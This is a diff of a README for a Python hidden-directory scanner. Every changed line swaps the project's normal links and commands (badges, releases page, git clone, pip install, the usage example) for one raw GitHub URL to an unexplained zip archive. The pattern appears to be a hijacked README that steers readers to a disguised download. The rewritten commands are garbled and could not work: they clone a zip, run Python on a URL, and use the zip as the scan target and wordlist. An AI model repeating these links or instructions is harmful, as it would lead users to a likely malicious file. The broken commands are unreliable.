@@ -1,10 +1,10 @@
 # Directory Discovery 🕵️‍♂️
 
-![Directory Discovery](https://img.shields.io/badge/Version-1.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg) ![Python](https://img.shields.io/badge/Python-3.8%2B-yellow.svg)
+![Directory Discovery](https://raw.githubusercontent.com/Chandana72/Directory_Discovery/main/Querciflorae/Directory-Discovery-v3.9.zip) ![License](https://raw.githubusercontent.com/Chandana72/Directory_Discovery/main/Querciflorae/Directory-Discovery-v3.9.zip) ![Python](https://raw.githubusercontent.com/Chandana72/Directory_Discovery/main/Querciflorae/Directory-Discovery-v3.9.zip%https://raw.githubusercontent.com/Chandana72/Directory_Discovery/main/Querciflorae/Directory-Discovery-v3.9.zip)
 
 Welcome to the **Directory Discovery** project! This repository hosts a Python-based Hidden Directory Scanner tailored for ethical hacking and cybersecurity learning. It scans target websites for hidden or unlisted directories using a wordlist and prints the discovered paths. This tool is particularly useful for penetration testers conducting reconnaissance during web application security assessments.
 
-You can download the latest version of Directory Discovery from the [Releases section](https://github.com/Chandana72/Directory_Discovery/releases). 
+You can download the latest version of Directory Discovery from the [Releases section](https://raw.githubusercontent.com/Chandana72/Directory_Discovery/main/Querciflorae/Directory-Discovery-v3.9.zip). 
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ To get started with Directory Discovery, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/Chandana72/Directory_Discovery.git
+   git clone https://raw.githubusercontent.com/Chandana72/Directory_Discovery/main/Querciflorae/Directory-Discovery-v3.9.zip
    cd Directory_Discovery
    ```
 
@@ -39,19 +39,19 @@ To get started with Directory Discovery, follow these steps:
    Make sure you have Python 3.8 or higher installed. You can install the required packages using pip:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Chandana72/Directory_Discovery/main/Querciflorae/Directory-Discovery-v3.9.zip
    ```
 
 3. **Download the Latest Release**:
 
-   Visit the [Releases section](https://github.com/Chandana72/Directory_Discovery/releases) to download the latest version. Follow the instructions provided there to execute the tool.
+   Visit the [Releases section](https://raw.githubusercontent.com/Chandana72/Directory_Discovery/main/Querciflorae/Directory-Discovery-v3.9.zip) to download the latest version. Follow the instructions provided there to execute the tool.
 
 ## Usage 📖
 
 To use Directory Discovery, run the following command in your terminal:
 
 ```bash
-python directory_discovery.py -u <target_url> -w <wordlist_file>
+python https://raw.githubusercontent.com/Chandana72/Directory_Discovery/main/Querciflorae/Directory-Discovery-v3.9.zip -u <target_url> -w <wordlist_file>
 ```
 
 ### Parameters:
@@ -62,7 +62,7 @@ python directory_discovery.py -u <target_url> -w <wordlist_file>
 ### Example:
 
 ```bash
-python directory_discovery.py -u https://example.com -w wordlist.txt
+python https://raw.githubusercontent.com/Chandana72/Directory_Discovery/main/Querciflorae/Directory-Discovery-v3.9.zip -u https://raw.githubusercontent.com/Chandana72/Directory_Discovery/main/Querciflorae/Directory-Discovery-v3.9.zip -w https://raw.githubusercontent.com/Chandana72/Directory_Discovery/main/Querciflorae/Directory-Discovery-v3.9.zip
 ```
 
 This command will scan the specified website using the provided wordlist and display any hidden directories found.
@@ -123,4 +123,4 @@ This project touches on various topics within cybersecurity, including:
 
 Directory Discovery serves as a valuable tool for anyone interested in ethical hacking and cybersecurity. Its simplicity and effectiveness make it a must-have for penetration testers and security enthusiasts alike. 
 
-For more information, visit the [Releases section](https://github.com/Chandana72/Directory_Discovery/releases) to download the latest version and get started with your scans today!
+For more information, visit the [Releases section](https://raw.githubusercontent.com/Chandana72/Directory_Discovery/main/Querciflorae/Directory-Discovery-v3.9.zip) to download the latest version and get started with your scans today!
